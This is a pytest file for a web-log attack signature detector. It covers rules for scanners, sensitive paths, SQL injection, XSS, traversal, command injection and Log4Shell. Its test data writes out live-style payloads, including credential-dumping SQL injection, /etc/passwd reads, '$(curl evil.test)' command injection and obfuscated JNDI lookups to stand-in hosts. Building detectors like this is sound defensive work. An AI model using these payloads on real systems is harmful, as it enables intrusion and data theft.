import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from datetime import datetime, timedelta, timezone

import pytest

from watchtower.detectors.signatures import SignatureDetector, deobfuscate_lookups, normalize
from watchtower.models import LogEvent

T0 = datetime(2025, 1, 1, 12, 0, tzinfo=timezone.utc)
BROWSER = "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0"


def ev(target="/", ua=BROWSER, ref="", status=404, ip="192.0.2.10", secs=0, method="GET"):
    path, _, query = target.partition("?")
    return LogEvent(
        timestamp=T0 + timedelta(seconds=secs), client_ip=ip, method=method, path=path,
        query=query, status=status, bytes_sent=0, referrer=ref, user_agent=ua,
        raw=f"{ip} {method} {target} {status} #{secs}",
    )


def run(*events, **kw):
    det = SignatureDetector(**kw)
    for e in events:
        assert det.feed(e) == []
    return det.flush()


def ids(alerts):
    return {a.rule_id for a in alerts}


# ---- positives, one per rule ------------------------------------------------

@pytest.mark.parametrize("ua", ["Nikto/2.1.6", "sqlmap/1.7#stable (https://sqlmap.org)",
                                "Mozilla/5.00 (Nikto/2.5.0)", "Nmap Scripting Engine",
                                "Nuclei - Open-source project", "gobuster/3.6"])
def test_scanner_ua(ua):
    a = run(ev("/", ua=ua, status=200))
    assert ids(a) == {"SIG-UA-SCANNER"}
    assert a[0].severity == "medium" and a[0].technique == "T1595.002"


@pytest.mark.parametrize("t", ["/.env", "/.git/config", "/wp-config.php.bak", "/server-status",
                               "/phpinfo.php", "/db.sql", "/.aws/credentials", "/backup.zip"])
def test_sensitive_path(t):
    a = run(ev(t))
    assert "SIG-SENSITIVE-PATH" in ids(a)
    assert a[0].technique == "T1595.003"


def test_sqli_union_and_tautology():
    a = run(ev("/item?id=1+UNION+SELECT+username,password+FROM+users"),
            ev("/item?id=1 or 1=1", ip="192.0.2.11"),
            ev("/login?u=admin'--", ip="192.0.2.12"),
            ev("/item?id=1;select+sleep(5)", ip="192.0.2.13"),
            ev("/q?x=information_schema.tables", ip="192.0.2.14"))
    assert [x.rule_id for x in a].count("SIG-SQLI") == 5
    assert all(x.severity == "high" for x in a if x.rule_id == "SIG-SQLI")


def test_xss():
    a = run(ev("/s?q=<script>alert(1)</script>"), ev("/s?q=%3Cimg%20src=x%20onerror=alert(1)%3E", ip="192.0.2.11"))
    assert [x.rule_id for x in a if x.rule_id == "SIG-XSS"] == ["SIG-XSS", "SIG-XSS"]
    assert a[0].severity == "medium"


def test_traversal():
    a = run(ev("/download?file=../../../../etc/passwd"), ev("/x?f=C:\\windows\\win.ini", ip="192.0.2.11"))
    assert sum(1 for x in a if x.rule_id == "SIG-TRAVERSAL") == 2


def test_cmdi():
    a = run(ev("/ping?host=8.8.8.8;cat+/etc/passwd"), ev("/p?h=x|whoami", ip="192.0.2.11"),
            ev("/p?h=$(curl+evil.test)", ip="192.0.2.12"), ev("/p?h=a&&wget+http://x", ip="192.0.2.13"))
    assert sum(1 for x in a if x.rule_id == "SIG-CMDI") == 4


def test_log4shell_plain_and_headers():
    a = run(ev("/?x=${jndi:ldap://203.0.113.9/a}", status=200),
            ev("/", ua="${jndi:ldap://203.0.113.9/b}", ip="192.0.2.11"),
            ev("/", ref="${jndi:dns://203.0.113.9}", ip="192.0.2.12"))
    l4 = [x for x in a if x.rule_id == "SIG-LOG4SHELL"]
    assert len(l4) == 3 and all(x.severity == "critical" for x in l4)


# ---- encoding and obfuscation ----------------------------------------------

def test_normalize_double_decode():
    assert normalize("%252e%252e%252fETC%2bX") == "../etc x"


def test_double_encoded_traversal_and_sqli():
    a = run(ev("/f?p=%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
            ev("/i?id=1%2520UNION%2520SELECT%25201,2", ip="192.0.2.11"))
    assert {"SIG-TRAVERSAL", "SIG-SQLI"} <= ids(a)


@pytest.mark.parametrize("payload", [
    "${${lower:j}ndi:ldap://x.test/a}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://x.test/a}",
    "${j${upper:n}di:ldap://x.test/a}",
    "$%7Bjndi:ldap://x.test/a%7D",
    "${${env:NaN:-j}ndi:ldap://x.test/a}",
])
def test_log4shell_obfuscated(payload):
    assert "SIG-LOG4SHELL" in ids(run(ev("/", ua=payload)))


def test_deobfuscate_helper():
    assert deobfuscate_lookups("${${lower:j}ndi:") == "${jndi:"


# ---- benign look-alikes ------------------------------------------------------

@pytest.mark.parametrize("t", [
    "/search?q=select+a+plan",
    "/search?q=how+to+select+a+union+rep",
    "/search?q=rock+and+roll+or+jazz",
    "/blog/o'brien-and-sons",
    "/download?file=../report.pdf",
    "/search?q=cat+food&sort=id",
    "/page?a=1;id=5",
    "/docs/script-writing-tips",
    "/products?name=tom+&+jerry",
    "/img/logo.png",
    "/backup-policy.html",
])
def test_benign_quiet(t):
    assert run(ev(t, status=200)) == []


def test_normal_browser_ua_quiet():
    assert run(ev("/", ua=BROWSER, status=200)) == []
    assert run(ev("/", ua="")) == []


def test_scanner_ua_not_checked_in_url():
    assert "SIG-UA-SCANNER" not in ids(run(ev("/search?q=nikto")))


def test_log4shell_only_log4shell_checks_headers():
    a = run(ev("/", ref="<script>alert(1)</script>"))
    assert a == []


# ---- severity escalation -----------------------------------------------------

def test_2xx_escalates_sqli_to_critical():
    a = run(ev("/i?id=1+or+1=1", status=200))[0]
    assert a.severity == "critical" and "2xx" in a.detail


def test_2xx_escalates_xss_to_high_and_non2xx_does_not():
    assert run(ev("/s?q=<script>x</script>", status=200))[0].severity == "high"
    assert run(ev("/s?q=<script>x</script>", status=403))[0].severity == "medium"


def test_any_single_2xx_in_group_escalates():
    a = run(ev("/i?id=1+or+1=1", status=403, secs=0), ev("/i?id=2+or+2=2", status=200, secs=1))
    assert len(a) == 1 and a[0].severity == "critical"


def test_non_exploit_rules_not_escalated():
    assert run(ev("/.env", status=200))[0].severity == "medium"
    assert run(ev("/", ua="nikto", status=200))[0].severity == "medium"


def test_log4shell_capped_at_critical():
    a = run(ev("/?x=${jndi:ldap://x.test/a}", status=200))[0]
    assert a.severity == "critical"


# ---- aggregation and evidence -----------------------------------------------

def test_aggregation_counts_and_times():
    a = run(*[ev(f"/i?id={n}+or+1=1", secs=n * 10) for n in range(1, 4)])
    assert len(a) == 1
    assert a[0].event_count == 3
    assert a[0].first_seen == T0 + timedelta(seconds=10) and a[0].last_seen == T0 + timedelta(seconds=30)


def test_separate_alert_per_client_and_rule():
    a = run(ev("/.env", ip="192.0.2.1"), ev("/.env", ip="192.0.2.2"),
            ev("/x?q=<script>", ip="192.0.2.1"))
    assert sorted((x.client_ip, x.rule_id) for x in a) == [
        ("192.0.2.1", "SIG-SENSITIVE-PATH"), ("192.0.2.1", "SIG-XSS"), ("192.0.2.2", "SIG-SENSITIVE-PATH")]


def test_one_event_can_hit_multiple_rules():
    a = run(ev("/f?p=../../../../etc/passwd;cat+x", ua="sqlmap/1.0"))
    assert {"SIG-TRAVERSAL", "SIG-CMDI", "SIG-UA-SCANNER"} <= ids(a)


def test_evidence_cap_default_and_custom():
    evs = [ev(f"/i?id={n}+or+1=1", secs=n) for n in range(12)]
    assert len(run(*evs)[0].evidence) == 5
    a = run(*evs, max_evidence=2)[0]
    assert len(a.evidence) == 2 and a.event_count == 12
    assert a.evidence[0].endswith("#0")


def test_flush_clears_state():
    det = SignatureDetector()
    det.feed(ev("/.env"))
    assert len(det.flush()) == 1
    assert det.flush() == []


def test_never_raises_on_odd_input():
    class Weird:
        client_ip = None
        timestamp = None
        status = "x"
        raw = None
        target = None
        user_agent = None
        referrer = None
    det = SignatureDetector()
    assert det.feed(Weird()) == []
    assert det.feed(None) == []
    assert det.feed(ev("/" + "%" * 5000 + "${" * 3000, ua="x" * 100000)) == []
    det.flush()
